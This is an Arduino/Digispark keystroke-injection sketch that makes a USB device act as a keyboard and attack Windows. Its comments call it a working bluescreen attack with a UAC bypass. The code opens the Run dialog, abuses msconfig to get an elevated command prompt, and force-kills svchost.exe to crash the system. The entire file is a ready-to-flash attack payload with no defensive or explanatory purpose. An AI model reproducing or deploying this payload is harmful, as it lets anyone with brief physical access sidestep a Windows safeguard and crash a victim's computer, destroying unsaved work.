// This code will bluescreen a computer! (Windows only)
// Tested working Windows 11
// UAC bypass by MTK911
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51

void setup() {
    pinMode(1, OUTPUT);
}

void loop() {
    DigiKeyboard.sendKeyStroke(0); // For older computers, initialize the keyboard.
    DigiKeyboard.delay(1000);
    
    digitalWrite(1, HIGH); // Turn on LED to signify task started

    DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // Go to desktop
    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Open Run
    DigiKeyboard.delay(1000);

    DigiKeyboard.println("msconfig -5"); // Access CMD
    DigiKeyboard.delay(1000);
    for(int i = 0; i < 14; i++) {
        DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
    DigiKeyboard.sendKeyStroke(KEY_L, MOD_ALT_LEFT);
    DigiKeyboard.delay(1000);

    DigiKeyboard.println("TASKKILL /IM svchost.exe /F"); // BSOD Achieved
    digitalWrite(1, LOW); // Turn off LED to signify task completed
    for(;;){}
}